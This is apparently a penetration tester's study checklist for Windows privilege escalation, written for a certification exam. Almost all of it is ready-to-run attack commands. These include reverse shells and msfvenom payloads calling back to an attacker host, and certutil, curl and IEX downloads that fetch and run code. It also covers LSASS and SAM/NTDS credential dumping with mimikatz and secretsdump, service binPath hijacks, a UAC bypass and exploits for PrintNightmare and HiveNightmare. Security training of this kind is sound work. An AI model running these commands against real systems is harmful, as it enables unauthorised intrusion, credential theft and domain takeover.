# 05 — PRIVESC · Windows

> Goal: turn a **low-priv Windows shell** into `NT AUTHORITY\SYSTEM` / local admin (then loot → re-run as the new context, or pivot to the domain).
> Every checklist point carries **its own command, from your CPTS notes**. Tick as you go.
> On the attack box: `export IP=...` · `export ATTACKER=$(ip -4 a show tun0 | grep -oP '(?<=inet )[\d.]+')` first.
> Order = simplest-first: enum → elevated prompt → creds → token-priv → group → service/perm → UAC → kernel/CVE LAST → coercion/breakout.

> **Golden rule:** run `whoami /priv` + `whoami /groups` FIRST, from a **truly elevated** prompt — UAC filters the token and *hides* SeImpersonate/SeBackup/SeLoadDriver. "Disabled" ≠ unusable: the privilege is still yours, enable it. Most exam boxes fall to one token privilege or one misconfigured service — don't reach for a kernel exploit until enumeration is exhausted. Re-run credential hunting after every privilege gain (you can suddenly read more).

> **OPSEC fork:** winPEAS/SharpUp/LaZagne are flagged by 47/70+ AV. Exam = no AV grading → run them freely for speed. Real engagement → fall back to manual `whoami` / `icacls` / `accesschk` / `findstr`. Check `Get-MpComputerStatus` / AppLocker before dropping tooling.

---

## 🔹 Situational awareness  (run on EVERY shell — screenshot the first two)

- [ ] **Context + privileges + groups (THE decider)** — `whoami` · `whoami /priv` · `whoami /groups` · `net user` · `net localgroup`
- [ ] **OS / patch gap / VM** (note for CVE matching) — `systeminfo` · `wmic qfe list brief` · `Get-HotFix | ft -AutoSize`
- [ ] **Processes / services / installed 3rd-party** — `tasklist /svc` · `wmic product get name`
- [ ] **Env + PATH (writable = DLL hijack), localhost-only ports** — `set` · `netstat -ano`
- [ ] **Logged-in users / pivot / NICs** — `query user` · `ipconfig /all` · `arp -a` · `route print`
- [ ] **Security controls (gate tooling)** — `Get-MpComputerStatus` · `Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections`
- [ ] **Auto-enum second opinion** (exam only) — `winPEAS` / `Seatbelt.exe -group=all` / `SharpUp.exe audit`

📓 `[[../windows-privesc/00-METHODOLOGY]]` · `[[../windows-privesc/03-situational-awareness]]` · `[[../windows-privesc/04-initial-enumeration]]` · `[[../windows-privesc/05-communication-with-processes]]`

---

## 🔹 Get a TRULY elevated prompt FIRST  (a UAC-filtered token lies in `whoami /priv`)

- [ ] **Suspect filtering** — few/no privileges from an admin user = filtered token, not "no privs"
- [ ] **Re-open elevated** (supply creds) — `runas /user:<USER> cmd` · or RDP in: `xfreerdp /v:$IP /u:<USER> /p:<PASS> /dynamic-resolution`
- [ ] **Confirm** — `whoami /priv` (SeImpersonate/SeBackup/SeLoadDriver should now appear)
- [ ] Privilege shows **Disabled** → still yours — `Import-Module .\Enable-Privilege.ps1; .\EnableAllTokenPrivs.ps1` (or the exploit auto-enables)

📓 `[[../windows-privesc/16-user-account-control]]` · `[[../windows-privesc/00-METHODOLOGY]]` §"Signal → Counter-Move"

---

## 🔹 Credential hunting & reuse  (always — run in parallel; search before you exploit)

- [ ] **Broad file sweep** — `findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml` · `dir /s /b C:\ | findstr /i "passw cred login"`
- [ ] **Classic locations** —
  ```
  type C:\Windows\Panther\unattend.xml
  type C:\inetpub\wwwroot\web.config
  reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
  reg query HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions
  ```
- [ ] **PowerShell history** (re-run after every priv gain) —
  ```
  gc (Get-PSReadLineOption).HistorySavePath
  foreach($user in ((ls C:\users).fullname)){cat "$user\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt" -ErrorAction SilentlyContinue}
  ```
- [ ] **Saved creds → reuse without password** — `cmdkey /list` → `runas /savecred /user:<DOMAIN>\<USER> "<COMMAND>"`
- [ ] **DPAPI PS cred** (run as the owning user) — `$c = Import-Clixml -Path '<PATH_TO_XML>'; $c.GetNetworkCredential().password`
- [ ] **Tooled sweep** — `.\lazagne.exe all` · `.\SharpChrome.exe logins /unprotect` · `Import-Module .\SessionGopher.ps1; Invoke-SessionGopher -Target <HOSTNAME>` · `netsh wlan show profile <SSID> key=clear`
- [ ] **KeePass found → crack offline** — `python2.7 keepass2john.py <KDBX_FILE>` → `hashcat -m 13400 <HASH_FILE> /usr/share/wordlists/rockyou.txt`
- [ ] **mRemoteNG / Sticky Notes** — `cmd /c more "%USERPROFILE%\APPDATA\Roaming\mRemoteNG\confCons.xml"` → `python3 mremoteng_decrypt.py -s "<ENC_PW>"`
- [ ] **Backups → offline SAM dump** (no admin on live host) — `restic.exe -r <REPO> snapshots` / `restic.exe -r <REPO> restore <ID> --target <DIR>` · `guestmount -a <VMDK> -i --ro /mnt/vmdk` → `impacket-secretsdump -sam SAM -security SECURITY -system SYSTEM LOCAL`
- [ ] **Reuse:** spray every found cred — `runas` / RDP same host · PtH across subnet (see *Dump & reuse*) · DCSync if DC → on success **re-run *Situational awareness***

📓 `[[../windows-privesc/21-credential-hunting-notes]]` · `[[../windows-privesc/23-further-credential-theft-notes]]` · `[[../windows-privesc/26-pillaging]]` · `[[../password-attacks/15-credential-hunting-in-windows]]` · `[[../password-attacks/13-attacking-windows-credential-manager]]`

---

## 🔹 SeImpersonate / SeAssignPrimaryToken  (most common — service acct = near-instant SYSTEM)

- [ ] **Confirm from the service acct** (MSSQL/IIS/web app) — `mssqlclient.py <USER>@$IP -windows-auth` → `enable_xp_cmdshell` → `xp_cmdshell whoami /priv`
- [ ] **Listener first** — `nc -lvnp <LPORT>`
- [ ] **Win10 / Server 2019+ → PrintSpoofer** — `xp_cmdshell c:\tools\PrintSpoofer.exe -c "c:\tools\nc.exe $ATTACKER <LPORT> -e cmd.exe"`
- [ ] **Server 2016 and earlier → JuicyPotato** — `xp_cmdshell c:\tools\JuicyPotato.exe -l <PORT> -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc.exe $ATTACKER <LPORT> -e cmd.exe" -t *`
- [ ] JuicyPotato fails *silently* on 2019/1809+ → switch to **PrintSpoofer / RoguePotato / GodPotato** immediately

📓 `[[../windows-privesc/07-seimpersonate]]`

---

## 🔹 SeDebugPrivilege  (dump LSASS, or spawn a SYSTEM shell from a parent token)

- [ ] **Confirm** — `whoami /priv`
- [ ] **Dump + parse LSASS** —
  ```
  procdump.exe -accepteula -ma lsass.exe lsass.dmp
  mimikatz.exe  →  sekurlsa::minidump lsass.dmp  →  sekurlsa::logonpasswords
  ```
- [ ] **Or SYSTEM shell via parent PID** — `tasklist` (find `winlogon.exe` PID) → `Import-Module .\psgetsys.ps1; [MyProcess]::CreateProcessFromParent(<WINLOGON_PID>,"cmd.exe","")`
- [ ] `sekurlsa::logonpasswords` blank → WDigest off → set `UseLogonCredential=1` + relogin, or just use the NT hash

📓 `[[../windows-privesc/08-sedebugprivilege]]`

---

## 🔹 SeTakeOwnershipPrivilege  (own then re-ACL any file — SAM / web.config / .kdbx)

- [ ] **Enable** — `Import-Module .\Enable-Privilege.ps1; .\EnableAllTokenPrivs.ps1` → `whoami /priv` (now Enabled)
- [ ] **Own + grant + read** —
  ```
  takeown /f '<FILE_PATH>'
  icacls '<FILE_PATH>' /grant <USERNAME>:F
  cat '<FILE_PATH>'
  ```
- [ ] `cat` still denied after `takeown` → ownership ≠ access — you skipped the `icacls /grant`

📓 `[[../windows-privesc/09-setakeownershipprivilege]]`

---

## 🔹 SeBackupPrivilege / Backup Operators  (read any file; NTDS on a DC)

- [ ] **Enable** — `Import-Module .\SeBackupPrivilegeUtils.dll` · `Import-Module .\SeBackupPrivilegeCmdLets.dll` · `Set-SeBackupPrivilege`
- [ ] **Read a protected file** — `Copy-FileSeBackupPrivilege '<SOURCE>' '<DEST>'`
- [ ] **On a DC → NTDS + SYSTEM hive** —
  ```
  diskshadow.exe            # set context clientaccessible; begin backup; add volume C: alias x; create; expose %x% E:; end backup
  robocopy /B E:\Windows\NTDS C:\Tools\ntds ntds.dit
  reg save HKLM\SYSTEM SYSTEM.SAV
  secretsdump.py -ntds ntds.dit -system SYSTEM.SAV -hashes lmhash:nthash LOCAL   # on attack box
  ```
- [ ] secretsdump can't decrypt → you didn't grab the **SYSTEM hive** alongside NTDS

📓 `[[../windows-privesc/10-backup-operators]]`

---

## 🔹 SeLoadDriverPrivilege / Print Operators  (Win10 < 1803 — Capcom.sys → SYSTEM)

- [ ] **Confirm** — `whoami /priv` (SeLoadDriver + Print Operators member, Win10 < 1803)
- [ ] **Register + load the vulnerable driver** —
  ```
  reg add HKCU\System\CurrentControlSet\CAPCOM /v ImagePath /t REG_SZ /d "\??\C:\Tools\Capcom.sys"
  reg add HKCU\System\CurrentControlSet\CAPCOM /v Type /t REG_DWORD /d 1
  EoPLoadDriver.exe System\CurrentControlSet\Capcom c:\Tools\Capcom.sys
  ExploitCapcom.exe
  ```
- [ ] **Cleanup** — `reg delete HKCU\System\CurrentControlSet\Capcom`

📓 `[[../windows-privesc/14-print-operators]]`

---

## 🔹 Server Operators  (SERVICE_ALL_ACCESS → swap a service binPath → local admin on DC)

- [ ] **Confirm service runs as LocalSystem** — `sc qc AppReadiness` · `c:\Tools\PsService.exe security AppReadiness`
- [ ] **Swap binPath to add yourself** (mind the **space after `=`**) —
  ```
  sc config AppReadiness binPath= "cmd /c net localgroup Administrators <USER> /add"
  sc start AppReadiness          # error 1053 is EXPECTED — the command STILL ran
  net localgroup Administrators
  ```
- [ ] **Re-logon** then loot the DC — `crackmapexec smb $IP -u <USER> -p '<PASS>'` · `secretsdump.py <USER>@$IP -just-dc-user administrator`

📓 `[[../windows-privesc/15-server-operators]]`

---

## 🔹 DnsAdmins  (malicious DLL via serverlevelplugindll → SYSTEM on DC)

- [ ] **Check you can restart DNS** — `wmic useraccount where name="<USER>" get sid` → `sc.exe sdshow DNS` (RPWP for your SID)
- [ ] **Build + register + restart** —
  ```
  msfvenom -p windows/x64/exec cmd='net group "domain admins" <USER> /add /domain' -f dll -o adduser.dll
  dnscmd.exe /config /serverlevelplugindll <FULL_DLL_PATH>
  sc.exe stop dns && sc.exe start dns
  ```
- [ ] Sign out, RDP back in. **Cleanup** — `reg delete HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters /v ServerLevelPluginDll /f` then `sc start dns`

📓 `[[../windows-privesc/12-dnsadmins]]`

---

## 🔹 Event Log Readers  (creds in 4688 command-line audit logs)

- [ ] **Confirm membership** — `net localgroup "Event Log Readers"`
- [ ] **Grep logged command lines** — `wevtutil qe Security /rd:true /f:text | findstr /i "/user"` (PS: `... | Select-String "/user"`)
- [ ] **Structured pull** — `Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'} | Select-Object @{name='CommandLine';expression={ $_.Properties[8].Value }}`

📓 `[[../windows-privesc/11-event-log-readers]]`

---

## 🔹 Hyper-V Administrators  (DCs virtualized — offline-mount the DC disk → NTDS)

- [ ] Offline-mount the DC `.vhdx` → grab `Windows\NTDS\ntds.dit` + SYSTEM hive → `secretsdump.py -ntds ... -system ... LOCAL`
- [ ] Pre-Mar-2020 → `vmms.exe` hardlink primitive → SYSTEM

📓 `[[../windows-privesc/13-hyperv-admin]]` · NTDS extraction same as *SeBackupPrivilege* block

---

## 🔹 Service & permission abuse  (services run as SYSTEM — any hijack = SYSTEM)

- [ ] **Triage** — `SharpUp.exe audit` (or manual `accesschk.exe /accepteula -quvcw <SERVICE_NAME>`)
- [ ] **Modifiable service binary** (`icacls` shows `Users:(F)`/`Everyone:(F)`) —
  ```
  icacls "C:\Program Files (x86)\PCProtect\SecurityService.exe"
  msfvenom -p windows/x64/shell_reverse_tcp LHOST=$ATTACKER LPORT=<LPORT> -f exe > SecurityService.exe
  certutil.exe -f -urlcache http://$ATTACKER:<LPORT>/SecurityService.exe SecurityService.exe
  cmd /c copy /Y SecurityService.exe "C:\Program Files (x86)\PCProtect\SecurityService.exe"
  nc -lvnp <LPORT>  ;  sc start SecurityService      # SYSTEM shell
  ```
- [ ] **Weak service perms (SERVICE_ALL_ACCESS)** — `sc.exe config <SERVICE> binpath="cmd /c net localgroup administrators <USER> /add"` → `sc.exe stop <SERVICE> & sc.exe start <SERVICE>`
- [ ] **Unquoted service path** — `wmic service get name,displayname,pathname,startmode |findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """` → plant `C:\Program.exe`
- [ ] **Permissive registry ACL** — `accesschk.exe /accepteula "<USER>" -kvuqsw hklm\System\CurrentControlSet\services` → `Set-ItemProperty ...\<SVC> ImagePath`

📓 `[[../windows-privesc/17-weak-permissions]]` · `[[../windows-privesc/20-dll-injection]]`

---

## 🔹 Vulnerable 3rd-party service  (localhost RPC port + known CVE/PoC)

- [ ] **Spot it** — `wmic product get name` · `netstat -ano | findstr 6064` · `get-process -Id <PID>` · `get-service | ? {$_.DisplayName -like 'Druva*'}`
- [ ] **Run the PoC** (e.g. Druva inSync 6.6.3 RPC 127.0.0.1:6064) — `notepad C:\Tools\Druva.ps1` → `.\Druva.ps1`

📓 `[[../windows-privesc/19-vulnerable-services]]`

---

## 🔹 UAC bypass  (you're admin but the token is filtered — `EnableLUA=1`)

- [ ] **Confirm bypassable** —
  ```
  REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA
  REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin
  [environment]::OSVersion.Version
  ```
- [ ] **DLL-hijack an auto-elevating binary** (arch MUST match — x86 here) —
  ```
  msfvenom -p windows/shell_reverse_tcp LHOST=$ATTACKER LPORT=<LPORT> -f dll > srrstr.dll
  curl http://$ATTACKER:8080/srrstr.dll -O "C:\Users\<USER>\AppData\Local\Microsoft\WindowsApps\srrstr.dll"
  C:\Windows\SysWOW64\SystemPropertiesAdvanced.exe        # or: rundll32 shell32.dll,Control_RunDLL <PATH_TO_DLL>
  whoami /priv
  ```

📓 `[[../windows-privesc/16-user-account-control]]`

---

## 🔹 Kernel & OS exploits  (patch-gap first; box-fragile — prefer the stable, known ones)

- [ ] **Enumerate gap** — `systeminfo` · `wmic qfe list brief` · `Get-Hotfix` · legacy: `Import-Module .\Sherlock.ps1; Find-AllVulns` / `python2.7 windows-exploit-suggester.py --database <date>-mssb.xls --systeminfo si.txt`
- [ ] **AlwaysInstallElevated** (simplest — both keys `0x1`) —
  ```
  reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
  reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
  msfvenom -p windows/shell_reverse_tcp lhost=$ATTACKER lport=<PORT> -f msi > aie.msi
  nc -lvnp <PORT>  ;  msiexec /i <PATH_TO_MSI> /quiet /qn /norestart
  ```
- [ ] **HiveNightmare CVE-2021-36934** (`icacls C:\Windows\System32\config\SAM` shows `Users:(RX)` **and** a VSS snapshot exists) —
  ```
  icacls c:\Windows\System32\config\SAM
  .\HiveNightmare.exe
  impacket-secretsdump -sam <SAM> -system <SYSTEM> -security <SECURITY> local
  smbclient -U administrator '\\$IP\C$' --pw-nt-hash      # paste NT hash as pw — no shell needed
  ```
- [ ] **PrintNightmare CVE-2021-1675/34527** (`ls \\localhost\pipe\spoolss` present) — `Import-Module .\CVE-2021-1675.ps1; Invoke-Nightmare -NewUser "<USER>" -NewPassword "<PASS>" -DriverName "PrintIt"`
- [ ] **CVE-2020-0668** (file-move → overwrite a SYSTEM-startable svc exe) — `C:\Tools\CVE-2020-0668\CVE-2020-0668.exe <SOURCE> <DEST>` → `net start MozillaMaintenance`
- [ ] **Legacy** — MS16-032 (Win7/2008/2012, **2+ cores**): `Import-Module .\Invoke-MS16-032.ps1; Invoke-MS16-032` · Server 2008 R2: MSF `exploit/windows/local/ms10_092_schelevator` (migrate to x64 first)

📓 `[[../windows-privesc/18-kernel-exploits]]` · `[[../windows-privesc/27-miscellaneous-techniques]]` · `[[../windows-privesc/29-windows-server-privesc-notes]]` · `[[../windows-privesc/30-windows-desktop-versions-privesc-notes]]`

---

## 🔹 User-coercion & restricted-desktop breakout  (local vectors exhausted)

- [ ] **SCF on a writable share → Responder** (Win ≤ 2016) —
  ```
  # drop @Inventory.scf:  [Shell] Command=2  IconFile=\\$ATTACKER\share\x.ico  [Taskbar] Command=ToggleDesktop
  sudo responder -wrf -v -I tun0
  hashcat -m 5600 <HASH_FILE> /usr/share/wordlists/rockyou.txt      # NTLMv2 must be CRACKED, not PtH-able
  ```
  Server 2019+ → SCF dead → malicious `.lnk` (`TargetPath=\\$ATTACKER\@pwn.png`) instead
- [ ] **Process-cmdline monitor** (scheduled tasks pass creds) — `IEX (iwr 'http://$ATTACKER/procmon.ps1')` · `Get-WmiObject Win32_Process | Select-Object CommandLine`
- [ ] **Citrix / restricted desktop** —
  ```
  xfreerdp /v:$IP /u:htb-student /p:'HTB_@cademy_stdnt!' /dynamic-resolution
  # Paint → File>Open → UNC \\127.0.0.1\c$\users\<u>  (dialogs IGNORE GP folder policy)
  smbserver.py -smb2support share $(pwd)                # serve pwn.exe (system("cmd"))
  Import-Module .\PowerUp.ps1 ; Write-UserAddMSI        # AlwaysInstallElevated path
  runas /user:backdoor cmd
  Import-Module .\Bypass-UAC.ps1 ; Bypass-UAC -Method UacMethodSysprep
  ```

📓 `[[../windows-privesc/25-interacting-with-users]]` · `[[../windows-privesc/24-citrix-breakout]]`

---

## 🔹 Dump & reuse local secrets  (after SYSTEM/admin — feeds lateral movement)

- [ ] **SAM/SYSTEM/SECURITY → offline crack** —
  ```
  reg.exe save hklm\sam C:\sam.save
  reg.exe save hklm\system C:\system.save
  reg.exe save hklm\security C:\security.save
  sudo impacket-smbserver -smb2support CompData /path/to/dir   # move *.save \\$ATTACKER\CompData
  python3 secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
  hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt
  ```
- [ ] **Or remote, with creds** — `netexec smb $IP --local-auth -u <user> -p <pass> --sam` (`--lsa` for cached)
- [ ] **LSASS without SeDebug tooling** — `rundll32 C:\windows\system32\comsvcs.dll, MiniDump <LSASS_PID> C:\lsass.dmp full` → `pypykatz lsa minidump lsass.dmp`
- [ ] **Credential Manager** — `cmdkey /list` · `runas /savecred /user:DOMAIN\<user> cmd` · `mimikatz "privilege::debug" "sekurlsa::credman" exit`
- [ ] **Reuse:** local-admin hash is usually reused fleet-wide (gold image) — that's the lateral path → `[[06-LATERAL]]`

📓 `[[../password-attacks/11-attacking-sam-system-security]]` · `[[../password-attacks/12-attacking-lsass]]` · `[[../password-attacks/13-attacking-windows-credential-manager]]` · `[[../password-attacks/10-windows-authentication-process]]` · `[[../password-attacks/00-METHODOLOGY]]`
<details><summary>▸ lab refs</summary>`[[../windows-privesc/32-winprivesc-skills-assessment-part1]]` — cmd-injection → PrintNightmare → LaZagne · `[[../windows-privesc/33-winprivesc-skills-assessment-part2]]` — unattend.xml → AlwaysInstallElevated → pwdump → hashcat · `[[../password-attacks/26-skills-assessment]]` — full SAM/LSASS/NTDS → crack chains</details>

---

## ⚠️ Gotchas — exam-time time-killers

- **`whoami /priv` from a non-elevated prompt lies.** UAC filters the token — SeImpersonate/SeBackup/SeLoadDriver won't show. Re-open CMD/PS **as administrator** before concluding "no privileges."
- **"Disabled" ≠ unusable.** A disabled privilege is still assigned — `EnableAllTokenPrivs.ps1` (or the exploit auto-enables). Don't skip the box.
- **JuicyPotato is dead on Server 2019 / Win10 1809+** and fails *silently*. No shell in seconds → PrintSpoofer / RoguePotato / GodPotato.
- **`binPath=` needs a space after the `=`.** `binPath= "cmd..."` works; `binPath="cmd..."` fails silently.
- **`sc start` error 1053 is EXPECTED** when binpath is a command, not a service exe — the `net localgroup` already ran. Don't retry.
- **Group membership needs a new logon.** After DnsAdmins/Server Operators add you to Administrators/DA → **sign out & RDP back in**; the current token is stale.
- **`takeown` alone gives nothing** — ownership ≠ access. You MUST `icacls <file> /grant <USER>:F` after.
- **SeBackup needs both DLLs imported** before `Set-SeBackupPrivilege` exists, **and** the SYSTEM hive alongside NTDS/SAM or secretsdump can't decrypt.
- **HiveNightmare needs a Volume Shadow Copy** to exist — the wrong-ACL alone isn't enough.
- **DPAPI is user+machine bound.** `Import-Clixml` / SharpChrome / LaZagne DPAPI stores only decrypt as the owning user — run as them / as SYSTEM.
- **`runas /savecred` only works if `cmdkey /list` already has the entry** — it never prompts, just fails quietly.
- **msfvenom arch must match.** x86 auto-elevating binary → x86 DLL; x64 service → x64 exe. Mismatch = no callback. Listener BEFORE payload, always.
- **In PowerShell `sc` is an alias for `Set-Content`** — use `sc.exe` for service ops.
- **NTLMv2 (hashcat 5600) must be CRACKED**, it is NOT Pass-the-Hash-able. SCF coercion is dead on Server 2019+ → use a `.lnk`.
- **Citrix/kiosk:** File>Open/Save dialogs **ignore** GP folder restrictions — UNC `\\127.0.0.1\c$\...` is the breakout primitive.
- **Re-run credential hunting after every privilege gain** — findstr / PS history / SessionGopher reveal files you couldn't read before. Hidden files lurk in `Music`/`Videos`/`Contacts`, not just Desktop.
- **Document the chain** (`proto://user:pass@host (source)` + every change). The exam grades the path; revert binPath/ownership/registry on real engagements.

---

## ➡️ Where next

- Got SYSTEM/admin → dumped SAM/LSASS/NTDS, local-admin hash reused fleet-wide → `[[06-LATERAL]]`
- Found creds / a new user, more hosts behind this one / domain in scope → `[[06-LATERAL]]`
- It's a Linux host, not Windows → `[[04-PRIVESC-LINUX]]`
- A second NIC in `ipconfig /all` → that's a **pivot, not a privesc** → `[[06-LATERAL]]`
- Need a stable shell / better foothold first → `[[03-EXPLOITATION-SERVICES]]`
- Need ports/versions or a way in first → `[[01-ENUMERATION]]` · `[[02-EXPLOITATION-WEB]]`
- **Confirmed ANY finding (SYSTEM, cred, misconfig) → log it NOW** → `[[07-REPORT]]`
- Symptom lookup → `[[../ATTACK-PATHS]]` · macro time-boxing → `[[../00-EXAM-MASTER]]`
